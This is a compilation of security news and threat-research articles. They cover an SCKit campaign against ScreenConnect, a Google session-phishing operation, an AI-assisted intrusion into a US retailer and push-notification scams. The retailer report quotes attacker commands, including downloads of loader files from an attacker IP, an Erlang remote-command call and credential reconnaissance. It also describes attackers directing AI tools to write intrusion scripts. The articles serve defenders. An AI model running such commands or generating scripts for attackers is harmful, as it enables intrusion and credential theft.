Attacks, Breaches & Threat Intel.title: SCKit Malware Turns ScreenConnect Support Sessions Into Potential MSP Attack Paths
Attacks, Breaches & Threat Intel.context: The ongoing campaign targeting ConnectWise ScreenConnect deployments involves the exploitation of a now-patched critical security flaw in the remote access software, and not a...
Attacks, Breaches & Threat Intel.full_text:
The ongoing campaign targeting ConnectWise ScreenConnect deployments involves the exploitation of a now-patched critical security flaw in the remote access software, and not a new vulnerability, it has emerged.

Blackpoint Cyber's Adversary Pursuit Group (APG), which shared the details with The Hacker News, said the recovered attacker toolkit exploits CVE-2026-84869 (CVSS score: 9.9), an improper privilege management and missing authorization vulnerability that could allow an attacker to file transfer and execute through an active remote session without authorization or host confirmation.

The cybersecurity company confirmed that testing against a fully patched ScreenConnect client successfully prevents execution of the exploit's payload.

"Our testing confirmed that the exploit targets CVE-2026-84869 and that the existing patch successfully blocks it," APG researchers Sam Decker and Nevan Beal said. "That's an important finding for security teams."

"But the toolkit also includes capabilities to hijack authenticated operator sessions and use legitimate ScreenConnect management features to push malicious code. Patching addresses the known exploit, but it doesn't eliminate the risks associated with a compromised operator session."

Notably, the SCKit malware contains functionality called RelayTrap to reverse-pivot to infect the workstations of technicians who attempt to investigate suspicious activity in a managed endpoint. In other words, the activity abuses trusted functionality and does not rely on a software vulnerability once an attacker obtains a valid session.

The attack sequence makes use of the platform's built-in Run Command functionality to execute commands. This involves first checking for an existing ScreenConnect installation before downloading and running an attacker-controlled MSI installer ("sc.msi"), which then delivers the batch script dropper ("sckit-run.bat").

The batch script dropper subsequently contacts "ns.mo7sen[.]dev" to fetch a PowerShell decoder ("sckit-decoder.ps1") and ultimately deploy various components associated with the SCKit toolkit.

This includes a PowerShell script ("SilentForceInstall-WithUninstall.ps1") used to establish persistent remote access by deploying two unauthorized ScreenConnect Access clients, along with a set of scripts and C# code designed to interfere with existing ScreenConnect Guest sessions, including RelayTrap.

The component attempts a guest-to-host file execution technique associated with CVE-2026-84869 by replacing the legitimate ScreenConnect Guest and sending the SCKit payload back toward the connecting technician for execution.

If this action is successful, the malware tries to recover the technician's authenticated ScreenConnect browser sessions and leverage their existing management permissions to distribute commands across additional endpoints they have access to. As a result, an attacker can move beyond the original compromised system and into other customer environments through the same infrastructure used to administer them.

"Because these commands were executed through existing ScreenConnect agents, the attackers could deploy additional software under the NT AUTHORITY\SYSTEM context without needing to establish a separate execution method on each machine," Blackpoint Cyber said.

"The unauthorized Access clients provide attackers with persistent control over the endpoint, while the RelayTrap components position the malware to intercept legitimate support connections. Rather than simply preventing administrators from accessing an infected machine, the toolkit attempts to use their next connection as an opportunity to extend the intrusion directly to the technician's workstation."

The end goal of the attack appears to target technicians, as they regularly connect to managed endpoints belonging to different customers, typically from workstations with access to administrative tools and authenticated management sessions. This enables the attackers to break out of the original endpoint and move the intrusion into an environment with potentially broader access and privileges.

Once the malware gets executed on the technician's machine, it shifts from remote support manipulation to session theft, searching the local browser data and process memory of the machine to recover an existing authenticated management session (i.e., .ASPXAUTH cookies) that can be used to propagate the malware to other endpoints without having to obtain their credentials.

"By first attempting to compromise a technician's workstation, then recover their authenticated ScreenConnect session, SCKit seeks to turn access to a single managed endpoint into an opportunity to reach other systems under that technician's control," the researchers said.

The Hacker News has contacted ConnectWise for comment, and we will update the story if we hear back.

It's worth noting that CVE-2026-84869 was previously exploited in a set of attacks in which threat actors leveraged ScreenConnect to distribute a malicious four-stage Visual Basic Script (VBScript) payload to newly connected systems and ultimately serve an XMRig cryptocurrency miner.

The vulnerability was added by the U.S. Cybersecurity and Infrastructure Security Agency (CISA) to its Known Exploited Vulnerabilities (KEV) catalog on September 11, 2026, requiring federal agencies to apply the fixes by September 14, 2026.

In response to the latest incident, ConnectWise has taken the precautionary step of disabling five third-party extensions in partner environments. However, Blackpoint Cyber said it found no technical link between those extensions and SCKit.

As of writing, there is no evidence that the activity has established successful propagation to a technician workstation or bypassed the vendor patch for CVE-2026-84869.

The findings reinforce the importance of patching ScreenConnect clients, and underscore the need for stronger operator-session protections, including tighter session validation and additional authentication for bulk administrative actions, Blackpoint Cyber noted.

"Organizations need to protect those sessions and put additional safeguards around high-impact administrative actions," the researchers said.

"For MSPs, the practical lesson is to investigate the management relationship, not only the endpoint. Rogue Access installations, administrative command history, technician workstations, and browser sessions all deserve attention, especially when support personnel have already connected to a suspected system."

RMM+ Authentication Flaw Found

Huntress, in an update, said it has identified a serious authentication flaw in versions 1.0.31 and 1.0.32 of RMM+, one of the five third-party ScreenConnect extensions that has already been blocked by ConnectWise.

"When an administrator had not configured an access key, the extension would accept a blank one, potentially allowing unauthorized commands to execute without going through ScreenConnect's normal authentication controls," the company said in a statement shared with The Hacker News.

RMM+ makes it possible for another tool to manage ScreenConnect sessions without a technician working through the console. It authenticates requests with a shared access key ("RMMPlus.AccessKey") stored in the extension's settings. However, in versions 1.0.31 and 1.0.32, the key defaults to a blank value.

Because RMM+ operates independently of ScreenConnect's normal user accounts, roles, and authentication controls, an attacker could potentially execute commands on the device without bypassing multi-factor authentication.

"Commands reached endpoints across several ScreenConnect instances within minutes. There was no corresponding login activity and the commands appeared in the logs reviewed linked to RMM+."

It's worth mentioning here that while the toolkit possesses capabilities to exploit CVE-2026-84869, there is no evidence to suggest that an unpatched ScreenConnect client was the initial entry point for the attack.

"At this time, initial access appears to be linked to malicious ScreenConnect extensions, although we do not have sufficient evidence to confirm this," Beal, principal MDR analyst at Blackpoint, told The Hacker News.

"Identifying patient zero would require additional forensic evidence from affected environments. Similarly, while November 11 marks the earliest publicly reported activity, we cannot rule out earlier compromises without further investigation. Our findings confirm the toolkit's capabilities but do not establish when or how the initial compromise occurred."

When contacted for comment, a ConnectWise spokesperson told The Hacker news that it's aware of reports of malicious activity affecting a limited number of ScreenConnect partners and that it's actively investigating the incident.

"While the initial access method remains unconfirmed, our initial assessment suggests the activity may involve a threat actor's abuse of independent third-party extensions installed in partner environments," the spokesperson said.

"We have disabled the identified extensions where we can take action as a precaution and are advising on-premises partners to disable them immediately. The presence of these extensions alone does not establish compromise. We encourage partners to review the precautionary guidance in the ConnectWise Trust Center, where we will provide updates as information is validated."

(The story was updated after publication to include responses and insights from ConnectWise, Blackpoint Cyber, and Huntress.)

Attacks, Breaches & Threat Intel.title: Calendar Invites and Live Proxies: Inside a Google Session Hijacking Campaign
Attacks, Breaches & Threat Intel.context: The Threat Research team at Material Security spotted the campaign and has since taken down hundreds of attacker domains in an effort the team calls Operation CloudFire
Attacks, Breaches & Threat Intel.full_text:
Since mid-August 2026, a phishing operation has been stealing live Google sessions from corporate users. Every check defenders normally lean on to judge a link came back clean, and the operator designed it that way on purpose.

The Threat Research team at Material Security spotted the campaign and has since taken down hundreds of attacker domains in an effort the team calls Operation CloudFire. Here’s what the researchers found.

The lure: Google Calendar invites

The messages show up as Google Calendar invites. Some arrive by BCC, and many come from an organization the recipient has already traded email with. The pretexts are deliberately boring: voicemail notifications, RFP and RFI requests, court summonses, and missed payment notices. Nothing about them stands out in a busy inbox.

Most of the links point to Google itself. The usual pattern runs through Google’s own /url redirector, with the real destination tucked into a query parameter. Other waves used share.google and Drive file links the same way, and one variant leaned on Intuit transaction notification links. Whenever a message gets scored, the domain, certificate, and reputation on display are all legitimate.

The capture: a reverse proxy in front of Google sign-in

Once a victim clicks through, the attacker runs a live reverse proxy in front of the real Google sign-in page. The victim types a password, gets a genuine prompt, and approves it while the operator watches in real time. The server passes each second factor along to Google as it comes in, whether that’s an SMS code, an authenticator code, Google’s Tap-Yes number matching, or phone-based account recovery. None of those controls stop the session from being captured.

The framework behind it, known as Nyasher, has been publicly documented since February, after researchers found a hardcoded key in its JavaScript.

Why the usual controls stay quiet

Reputation systems answer questions about ownership. They ask who registered a domain, what else it has hosted, and whether anyone has complained about it. This campaign was built so every one of those answers came back harmless.

It works in three layers. The first is Google’s redirector, which gives the initial hop a trusted Google URL. The second is a Cloudflare Turnstile challenge, and in some builds it’s the real widget served from Cloudflare’s own infrastructure. The third is the password capture page, and that’s where things get tricky for defenders. There’s no static site to scan. JavaScript builds the page in the browser after the visitor clears the challenge, so a crawler has nothing to fetch and a proxy log has nothing to record. As far as the researchers know, nobody had scanned those pages before the campaign was documented.

The infrastructure is also meant to be thrown away. Early waves used many lure domains spread across several registrars, and most were registered just days before use. Receiving endpoints went live one to twenty days ahead of the wave they served. One wildcard certificate was issued 46 minutes before the domain it covers was even registered. Blocking any single piece costs the operator a few dollars and an afternoon.

What stopping it took

Researchers tracked the campaign from the start, following each variant as lures, gates, and endpoints rotated. Once detections were in place, they caught more than 99% of the malicious messages, with a reclassification rate of 0.01%. It’s been steady work, since the attacker kept changing tactics, themes, and lure text to slip past static, machine learning, and agentic detections.

What worked was refusing to let any one signal make the call. Reputation alone wouldn’t have caught this. Neither would link analysis, since the first hop is a Google URL and the final page doesn’t exist until a browser builds it. Instead, the detection approach weighs technical indicators alongside the apparent intent of the message, where its links actually end up, and the sending relationship behind it. Any one of those can be enough to act on. A detection built around a single signal inherits that signal’s blind spots, and this operator has put real effort into mapping them.

Where the analysis happens matters too. Gateways built to inspect mail in transit aren’t a great fit for calendar invites, and much of this campaign arrives as invites. Calendar invites need to be treated as a threat surface of their own, with the account’s full history used as context next to the technical signals.

Where the damage lands

A hijacked session leaves its trail in Google Workspace audit logs. A live session reaches mail, Drive, and the ability to grant OAuth access in the victim’s name, so the blast radius goes well past the inbox.

That raises a couple of hard questions for security teams. Who’s actually reviewing those audit logs, and how fast can they act on what they find? Could the team revoke sessions, contain OAuth grants, and reset the affected account within an hour? Plenty of programs can’t, and an attacker holding a live session can do a lot in an hour.

Operation CloudFire: going after the infrastructure

By late September, the researchers decided that tuning rules, retraining models, and updating agents wouldn’t solve this alone. Detection protects customers, but it does nothing about an operator who’s already prepping the next wave. So the team went after the infrastructure.

Analysts pulled the gateway and backend URLs as messages were being sent and reported them through Cloudflare’s abuse reporting system. Cloudflare’s abuse team confirmed the fake interstitial and the proxied Google sign-in page behind it, then put its own phishing warning in front of those destinations.

That had two effects. First, the attacker’s infrastructure got burned. Every reported gateway and endpoint had to be re-registered, re-pointed, and re-certified before the operator could send again. Second, it protected people well beyond any one company’s customers. Anyone who clicked a reported link saw a warning page instead of a credential form.

One month by the numbers

These figures only cover organizations that agreed to share data, so the real totals are higher. Over one month of Operation CloudFire, researchers recorded:

68,676 campaign messages blocked

2,112 unique malicious URLs analyzed

897 unique domains taken down

8,570 unique compromised sender addresses across 6,354 root domains

The messages also followed a clear rhythm, with sends tracking US business hours.

Message delivery by time of day

The sender count explains how the campaign earned trust. The attacker controlled each compromised account before the first invite went out, and each one sent invites to the account owner’s saved contacts, among others. Recipients saw a name or domain they knew, on a domain with a clean history, at a sensible time of day. Reputation feeds had no reason to flag any of it.

Where things stand now

The phishing themes have moved from calendar invites to Google Drive file and document share invites. Researchers haven’t seen a matching jump in other lures or tactics, and activity from this group seems to have scattered. For now, the campaign looks finished.

Messages detected by week

Domains registered by interval

That’s a snapshot, and it could change fast. Rebuilding the infrastructure is cheap, and the framework has been public since February. The operator also shipped an unfinished Microsoft 365 branch alongside the live Google code. It includes a stylesheet path, a second harness, and a title string that decodes to a Microsoft sign-in prompt. None of those paths resolve today, and adding the new brand would only mean dropping in a file, with no code changes. The follow-on is built and waiting.

The researchers see the theme rotation as ongoing iteration and expect the next pivot to look a lot like this one, just with a different brand on it.

The full technical breakdown, including indicators of compromise and a timeline, is in the companion whitepaper. Teams hunting for this activity in their own environments should start there.

Attacks, Breaches & Threat Intel.title: Inside an AI Attack Against a US Retailer
How AI Revived a Stalled Attack on a U.S. Retailer
Attacks, Breaches & Threat Intel.context: Similar labelled scripts also appeared on September 18, 2026 on three database servers in the same network, so the web server was not the first place the attackers appeared to...
Attacks, Breaches & Threat Intel.full_text:
How the attackers used AI

Phase one: hand-typed commands

Activity on the web server began on September 21, 2026, with a short burst of discovery commands, followed by a gap of about 12 hours. When it resumed on September 22, the commands showed the marks of manual typing. Across 110 distinct actions there were three typing errors (including systemifo and pwoershell), each corrected within seconds, and the command lengths averaged about 45 characters. The attackers re-ran the same blocked loader five times in about 20 minutes with no change of approach.

Phase two: AI-generated commands

On September 23, the attackers executed around 50 long scripts over roughly two hours. The median script ran to more than 500 characters, over 10 times the length of the hand-typed commands. None of the scripts contained a typing error. Each submission bundled several probes, labelled each result with a banner such as ===FILES MENTIONING CONN STRINGS===, wrapped cmdlets in error handling and capped the amount of output returned. That layout suits a consumer reading results back through a narrow text channel, and it is a common pattern in code generated by large language models (LLMs).

The strongest evidence of AI usage was in the comments. Several scripts opened with text that stated a hypothesis, cited earlier results and revised a previous conclusion before acting. One recorded that earlier negative results about a server had come from a SOCKS proxy channel known to report false successes, so the conclusion had to be re-measured from a host with a direct route. Human operators do not usually write that kind of deliberation into a one-shot web shell command.

An operator in the loop, not an autonomous agent

The gap between submissions never fell below seven seconds and longer pauses of two-to-eight minutes came before changes of strategy. There was no scanner-style burst activity and no fixed-interval beaconing. This is consistent with an operator copying output into an AI tool and pasting the next command into the web shell. Symantec assesses the AI assistance with high confidence and the operator-in-the-loop model with moderate confidence. The model or service involved could not be identified.

Similar labelled scripts also appeared on September 18, 2026 on three database servers in the same network, so the web server was not the first place the attackers appeared to use AI. Comments disappeared from the data between September 19 and 22 and returned in a different style, which may mean that more than one AI model was in use.

Tooling and tradecraft

DLL sideloading

The attackers downloaded an old, legitimate Bitdefender executable (bdreinit.exe) with a malicious DLL (log.dll) and a file named log.txt. The executable loads log.dll from its own folder, and the DLL reads and decrypts the text file, which holds the payload. The pairing has been documented in public reporting by Elastic and SecureWorks (now part of Sophos) on ShadowPad loaders. However, the bdreinit.exe and log.dll pairing has also been used by several threat actors in different operations, so it does not on its own identify the malware or the actor. A second set used a G DATA signed executable (ask.exe) with ask.dll and ask.txt.

ShadowPad is a modular remote access Trojan (RAT) that is closely associated with China-based APT groups. It is associated with various threat groups, particularly the APT41-nexus groups such as Blackfly, Grayfly and Redfly. It was documented being used by Glowworm in 2024, which was the first time that group had been observed using the malware. It has more recently been used in attacks where ransomware has been deployed. Typically, ShadowPad is loaded onto victim networks via DLL sideloading. DLL sideloading is a technique where the attackers use the DLL search order mechanism in Windows to plant and then invoke a legitimate application that executes a malicious DLL payload.

Process-tree breaking

After repeated terminations, the attackers deployed a utility called BreakChain, which relaunches a target so that it no longer appears as a child of the IIS worker process (w3wp.exe). It offers five launch modes and the attackers used two, the WMI and shell modes. About 75 minutes after the first build was blocked, the attackers deployed a second build.

Yuze tunnelling tool

In the August 2026 intrusion at a different organization, the attackers ran Yuze to connect back to 204.194.49[.]129, the same server later used to stage payloads against the retailer. Yuze is a lightweight, open-source tunnelling tool that supports forward and reverse SOCKS5 proxies. Trend Micro has documented its use by Warlock ransomware attackers, and Warlock is developed by a China-nexus actor Symantec tracks as Longlegs (aka Storm-2603). Because Yuze is publicly available, its presence is not enough on its own to tie this activity to Warlock or Longlegs.

Attack chain: Intrusion against a U.S. retail organization

The initial infection vector is unknown. The earliest malicious activity took place on September 18, 2026, on three servers within the same organization (Computer 1, Computer 2 and Computer 3), all running Microsoft SQL Server. On each, malicious commands were launched as cmd.exe running directly under sqlservr.exe, which indicates that they were issued through the database service itself, most likely via its xp_cmdshell feature.

On Computer 2, the commands arrived as multi-part PowerShell scripts in which each section was introduced by a quoted text label, so that a single execution returned a structured report. This layout, together with the very short gaps between submissions, resembles output generated by an LLM rather than commands typed by hand, and it recurs throughout the intrusion.

"### whoami/priv ###"whoami /priv"### cmdkey ###"cmdkey /list"### RMS service accounts ###"Get-CimInstance Win32_Service | Where-Object {$_.PathName -match 'RMS|Store|Dynamics'} | Select-Object Name,StartName,PathName | Format-List | Out-String

Further scripts searched the point-of-sale synchronization directories for files containing credentials or connection strings. That the attackers went straight to these folders suggests that they had already identified the retail application. The scripts also tested whether the server could reach the internet by opening a TCP connection to 155.254.22[.]215 on port 9458. The attackers repeated this egress test on Computer 1 shortly afterwards.

The attackers then built a privilege escalation tool directly on Computer 2. Around 20 consecutive PowerShell commands appended base64-encoded text to a file in a new folder under ProgramData, which was decoded with Certutil and compiled with the .NET C# compiler, csc.exe. The source was EfsPotato, a publicly available exploit that abuses the Windows Encrypting File System RPC interface to run commands as SYSTEM. The payload saved the SAM, SYSTEM and SECURITY registry hives, from which an attacker can extract local NTLM password hashes, cached domain credentials and LSA secrets.

On September 21 a fourth computer (Computer 4), a Windows web server, appeared. Its malicious commands were launched as cmd.exe under w3wp.exe, which is characteristic of a compromised web application. A short burst of discovery was followed by a gap of about 12 hours.

When activity resumed on September 22, the commands showed signs of typing by a person, including the mistyped “systemifo” and “pwoershell,”. The attackers used Invoke-WebRequest to pull bdreinit.exe, log.dll and log.txt from 204.194.49[.]129 on port 8080 into the ProgramData folder:

powershell invoke-webrequest 204.194.49.129:8080/log.txt -OutFile CSIDL_COMMON_APPDATA\log.txtpowershell invoke-webrequest 204.194.49.129:8080/log.dll -OutFile CSIDL_COMMON_APPDATA\log.dllpowershell invoke-webrequest 204.194.49.129:8080/bdreinit.exe -OutFile CSIDL_COMMON_APPDATA\bdreinit.exe

Security terminated bdreinit.exe each time, but the attackers launched it roughly five times in less than 20 minutes, directly, through cmd.exe and through PowerShell. They then downloaded a PowerShell script, server.ps1, first from 166.0.25[.]106 and then from 154.81.37[.]136, which indicates fallback infrastructure. The script was an AES-encrypted PowerShell reverse shell that connects back to 166.0.25[.]106 on port 443. For persistent access that did not depend on the original entry point, the attackers also wrote two ASP web shells (filemanager.asp and qwdajhsd.asp) into the web application's images folder.

On September 23 the attackers returned to Computer 4, deleted the earlier files and staged a second side-loading set, ask.exe, ask.dll and ask.txt, launched with a -gdata argument. They also used an executable named mmc.exe, a name that mimics the Microsoft Management Console, as an intermediary to launch the others, presumably to change the parent process. After the launches were again terminated, they deleted the files and downloaded them once more. They then fetched a utility named BreakChainC.exe.

Shortly afterwards, the commands changed character again. For nearly two hours they were long, multi-part PowerShell scripts, often only seconds apart, with no typing errors, and labelled sections such as: ===FILES MENTIONING CONN STRINGS===. Each appeared to build on the output of the one before it. The attackers collected credentials from the web server, including: connection strings; the FileZilla Server user database; FileZilla, WinSCP and PuTTY client settings; saved RDP files; IIS configuration, and Windows logon registry values.

The attackers then turned to the server's monitoring software. They located the SolarWinds Orion installation, queried its local SQL Server instance for the table of monitored nodes, and read the Zabbix agent's pre-shared key. Using SQL logins and passwords that they already held, they connected to two remote SQL Servers and tested whether each login had the sysadmin role.

The next step was lateral movement. The attackers identified the RabbitMQ message broker that ships with Orion and read its Erlang cookie file (.erlang.cookie): the shared secret that Erlang nodes use to authenticate to one another. They ran the erl.exe that Orion bundles, with the cookie, to call the RabbitMQ node on a second web server and run an operating system command. About 10 minutes had passed since they first queried the Orion service. The command was encoded as a list of decimal character codes, which does not appear in plain text in the command line:

"CSIDL_PROGRAM_FILESX86\solarwinds\orion\erlang\erts-9.0\bin\erl.exe" -noshell -sname <random> -setcookie [REMOVED] -eval "io:put_chars(rpc:call('rabbit@<web server 2>',os,cmd,[[119,104,111,97,109,105]])),halt()."

The first command decodes to whoami. Subsequent calls decode to registry queries against the SAM database, the SECURITY hive's cached-logon and LSA secrets locations, and the built-in Administrator account, which together hold password hashes, cached domain credentials and LSA secrets.

Several of the scripts that followed opened with comments that stated a hypothesis, cited earlier results and revised a previous conclusion. This is unusual in commands and suggests that the reasoning of the tool generating them was being passed through with the code. The comments also refer to a SOCKS channel that the attackers were already using to reach the internal network; the telemetry does not show it being set up.

# Re-measure <host A> from <host B>, which shares the /27 with it.# Every previous negative result about <host A> came from our SOCKS channel, and that# channel is known to fabricate success on <host A> (445/139) - and to 401 even with# valid SSPI. So the "FTP anonymous off, 9 reused passwords failed" verdict has# to be re-taken from a vantage point that actually routes to the host.

Later that same day, the attackers fetched a second build of the process-tree-breaking utility, BreakChainCs.exe, and used its shell and WMI modes to launch bdreinit.exe and the ask.exe kit so that they no longer appeared as children of w3wp.exe. They also copied ask.exe to a file named w3wp.exe in ProgramData, matching the name of the IIS worker process.

CSIDL_COMMON_APPDATA\breakchaincs.exe -m wmi "CSIDL_COMMON_APPDATA\bdreinit.exe"cmd /c copy CSIDL_COMMON_APPDATA\ask.exe CSIDL_COMMON_APPDATA\w3wp.exe

On September 24, a fifth computer (Computer 5), another SQL Server host, saved its SAM and SECURITY hives to a new folder under ProgramData. Activity resumed on a larger scale on September 25. On Computer 4, the security product detected a Chisel tunnelling tool, and the attackers ran a PowerShell download cradle to fetch a script, sqlrun2.ps1, from a new staging server at 108.165.20[.]205 on port 8080.

Computer 2 was active again the same day, and its commands suggest that it is a domain controller. The attackers saved the registry hives again, searched the system drive for NTDS.dit, the Active Directory database that stores the password hashes for every domain account, and searched SYSVOL for Group Policy Preferences cpassword values and Active Directory for LAPS (Local Administrator Password Solution) passwords. They also tried a short list of candidate passwords for the sa account against several SQL Servers, and xp_cmdshell commands then ran against one of them, which indicates that one login succeeded.

A sixth computer (Computer 6) joined the activity that afternoon, and the attackers scanned more than a dozen internal hosts for SQL Server, SMB, RDP and WinRM ports. On September 26 a seventh computer (Computer 7), running an older version of SQL Server, ran a password sprayer. It downloaded a list of credential pairs from the new staging server and tested each pair against a web service. Several file names in this incident begin with i followed by a number, such as i187_winspray.ps1, which may be a per-target numbering scheme in the attackers' tooling. Use of the sprayer on this computer continued until at least September 29.

Significance

The most important finding in this investigation is not a new technique. Erlang remote procedure calls, cookie theft and credential harvesting from configuration files are all long documented. What AI assistance appears to have changed is the speed and reliability with which the attackers applied them. Within about 10 minutes of discovering what software ran on the web server, the operators had identified an unfamiliar message broker, located its shared secret and used it to run commands on another host. The day before, the same operators with the same access had achieved little.

The tooling suggests that AI was added to an existing toolkit rather than being its source. The same side-loading components and staging server appeared in an earlier intrusion in which Symantec found no signs of AI assistance. A separate report published on September 22, 2026 by Gambit Security described a financially motivated operator who ran open-source AI tools against online retailers, whose AI console loaded a Chinese-language persona titled “SOUL - Red Team Operator,” and listed 155.254.22[.]215 as its staging and command server and AI console. That is the address the attackers tested from the victim's servers on September 18, 2026. Taken together, the shared address, the focus on retailers, and the search for point-of-sale credentials suggest that the two operations may be linked, although the Gambit report does not mention the loaders described here. It does describe an instruction to wipe card data after extraction, but we saw no destructive activity in this intrusion.

Other AI-assisted attacks

This attack was one of dozens of AI-assisted attacks Threat Hunter has investigated in recent months. Several further cases remain under investigation.

The pace of these attacks increased as the quarter went on, with the majority of attacks occurring in September. Brief outlines of some of these attacks are below.

University web server in Vietnam

In June 2026, attackers deployed a web shell on a university web server in Vietnam and altered the site's configuration so that a malicious component would load with it. They also overwrote some of its core files and changed file dates to cover their tracks. They next made six failed attempts to download PrintSpoofer, a public tool that gives attackers full control of a Windows machine. When direct downloads failed, they smuggled the tool in as text and rebuilt it on the server.

The aim of the attack seems to have been to take full control of the server and keep that access. Attacker commands ran about a second apart, and the first sessions were separated by almost exactly three and 12 hours, which points to automation. One of the clearest signs of AI usage was a script that contained numbered notes in Chinese addressed to the operator, including a suggestion to focus on a particular directory because of a username found earlier. That read like a chat assistant's reply pasted straight into the attack.

ICT provider in East Africa

In late August 2026, attackers spent about 61 hours inside the network of a technology provider that serves banks and telecoms in East Africa. They ran commands through both a web shell and the company's database service, set up tunnels to route their traffic, prepared a dump of stored login credentials in a web folder and used a built-in Windows tool to copy the Active Directory database, which holds password hashes for every account. They also searched files for mobile-money terms, such as M-Pesa, and for payment keys and callback addresses. This suggests they were after the credentials that connect the company's systems to mobile payment services.

For one period, the nature of the attacker commands changed in the same way as described above in our account of the attack on the U.S. retail organization. The attackers submitted 212 long scripts, averaging about 1,000 characters, with explanatory comments, tidy labelled output and no typing errors. One script built a list of likely passwords from the names of the company's applications, which it had found earlier, and another built a low-level network query by hand that worked the first time. In the later hands-on phases, five commands in a row failed with simple mistakes. The AI added no new technique, but it let the attackers apply known ones quickly and accurately.

Government hydroelectric company in a south Asian country

In August 2026, attackers deployed a PHP web shell on a Windows server belonging to a hydroelectric power company in a south Asian country. After some hand-typed reconnaissance on August 13, they switched to PowerShell scripts that tried four sets of credentials against several databases, pulled rows from tables that held passwords, checked whether the account had administrator rights (using obfuscated queries) and whether it could run commands through the database, and then tried to run a command on a second server.

The goal appears to have been to harvest passwords and move laterally to other systems. The scripts had section headings, neat error reports and trimmed output, which is typical of AI-written code. One still contained the placeholder YOUR_IP where an attacker's server address should have been, which suggests the generated script was pasted in without being edited.

Web hosting server in a south Asian country

In July 2026, attackers used a web shell on a shared web hosting server in a south Asian country. They worked in four bursts about three hours apart, running roughly 970 commands about one second apart with no typing errors, which points to automated or AI-driven activity.

They took database passwords from the sites' configuration files, logged in to a remote database server that held about 20 databases, including tables of cryptocurrency wallets, money transfers and payouts, and created scheduled tasks with names designed to look like system health checks. They also tried to take full control of the server using a public exploit for a 2022 Windows vulnerability (CVE-2022-21882).

When security software blocked the download, they retried in five different ways within about 90 seconds. The wallet and payout tables suggest that the attackers were financially motivated.

Linked cases in south Asia

Three more attacks, at organizations that appear to be in south Asia, shared tools, infrastructure or both. At the first organization, on September 20, 2026, attackers spent about two hours on a compromised web server testing which methods would let them download and run code and marked each success with a short word such as PSOK or MSHTAOK. They then downloaded a malicious program disguised as a Windows system file (svchost.exe) from a web domain. Over four days of sessions, from September 18 to 22, they also shut down security software, raised their privileges and set up daily persistence.

An attack on a second organization used a staging server and download domain that were also used in the first attack. Two web servers were compromised, with marker words such as WEBSHELL_OK, showing which steps had worked. On one machine the attackers ran 290 commands in 28 minutes, with 44 percent of the gaps between them a second or less. When a privilege escalation tool was blocked, they rebuilt it on the machine within about 10 minutes. They installed a custom backdoor program as a Windows service on one server and hid another inside an application folder on the other. The aim in both cases appears to have been lasting, high-level control of the servers, but the motive is unclear.

At the third organization, the earliest activity, on September 2, came through the SQL Server database service. The attackers set up scheduled tasks to keep their access, copied the system's stored password data, and created a hidden tunnel using a Tailscale-like tool that they renamed after security software blocked it. They then sprayed passwords against an external database server and stole a spreadsheet whose name suggests it held application security details, by encoding it and printing it out in chunks.

The commands ran about a second apart in sessions roughly three hours apart, with labelled sections and numbered scripts, and the access was still active in early October. The motive for these attacks is unclear.

Common trends

Many cases followed a similar sequence: command execution through a web shell or SQL Server, a privilege escalation tool from the Potato family such as PrintSpoofer, GodPotato or EfsPotato, registry hive dumps and, in some, a tunnelling tool such as Chisel. In all cases, AI supplied no new techniques or tactics, only a new way of meeting objectives.

AI increased the speed and persistence of the attacks. After a block, attackers renamed or rebuilt their tools within seconds or minutes. One rebuilt an exploit in about 10 minutes, another swapped tool and file names within about 10 seconds of a block, and in the retail attack the second build of the process-tree-breaking tool arrived about 75 minutes after the first was blocked.

The degree of human involvement varied. In the retail attack, the gap between scripts never fell below seven seconds, which suggested an operator relaying output between an AI tool and the web shell. Several other attacks showed median gaps of about one second and sessions that recurred about every three hours, which look more like automation. In most cases, the evidence could not show whether an operator was in the loop.

Protection

For the latest protection updates, please visit the Symantec Protection Bulletin.

If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.

Attacks, Breaches & Threat Intel.title: Why scammers want you to allow push notifications
Attacks, Breaches & Threat Intel.context: Allowing notifications doesn’t install malware
Attacks, Breaches & Threat Intel.full_text:
A website asks you to click “Allow” to start a quiz or read an interesting story. A little later, your device starts warning you about viruses, missed payments, or legal trouble.

While every message may look like a new security problem, the cause could be a permission you granted earlier.

For scammers, browser push notifications turn a passing visit into something much more valuable: access to your attention after you have left their website.

Two investigations—including our own research into deceptive quiz sites and HUMAN Security’s investigation of an operation called Pushpaganda—show how that permission can become a tool for repeated advertising, scareware, and fraud.

Ordinarily, a deceptive website has a limited opportunity to influence you. Once you leave, its sales pitch disappears.

A simple browser push notification permission changes that relationship. A website you’ve authorized can send browser notifications even when you’re not visiting it. Depending on the platform and browser configuration, those messages can appear even when the browser is not visibly open.

Just what scammers need

That gives scammers several advantages:

Repeat opportunities to get a click. Instead of relying on one visit, they can send more messages to bring you back to their sites.

A more convincing place to display a lie. Notifications appear through the browser and operating system, while their wording and imagery can impersonate security alerts, financial messages, or people you know.

Distance from the original trick. By the time alarming messages start appearing, you may not remember which website received permission, let alone connect the alerts to an innocent-looking quiz.

More chances to make money. The resulting traffic can feed advertising, affiliate promotions, scams, and unwanted downloads.

Allowing notifications doesn’t install malware. But scammers can use them to trick you into clicking a harmful link or downloading something dangerous. That explains why your device can display frightening warnings while a malware scan finds nothing wrong.

The campaigns

The quiz that came with an unwanted extra

Our investigation, published on March 9, began with customers who thought their devices were infected. Malwarebytes scans came up clean. Screenshots helped our Malware Removal Support team identify the real source of the trouble: web push notifications.

While the quizzes were real, the trick was making people think they had to allow the notifications to take them.

Clicking “Start the quiz” first brought up the browser’s notification permission request. Behind that legitimate browser prompt, the website displayed its own instruction:

“Click ‘Allow’ to continue.”

The page made it seem you had to allow the notifications to take the quiz, when it actually meant agreeing to receive future messages.

From clickbait to a notification loop

On April 14, HUMAN Security’s Satori researchers published a larger example of the same underlying strategy. They called it Pushpaganda.

Instead of quizzes, the operation used sensational articles and images, many showing signs of AI generation. Headlines promised attention-grabbing financial developments or implausible technology bargains. The content appeared in Google Discover feeds, exposing it to Android and Chrome users. Researchers could not establish whether those placements resulted from paid promotion or search optimization.

Once someone visited an associated website, the operation prompted them to enable notifications. The messages that followed had little to do with the article that attracted the visitor. Researchers observed fake arrest warrants, false financial alerts, and notifications mimicking missed calls from “Mom” or other family members.

Scam or legit? Scam Guard knows.

TRY IT NOW

Scam Guard stats

The graph shows weekly counts of reports classified by Scam Guard as matching quiz-site notification abuse (red) and Pushpaganda (blue), based on the information provided by users.

The counts show reports over time linked to these campaigns. They don’t represent unique victims, confirmed infections, or total campaign activity.

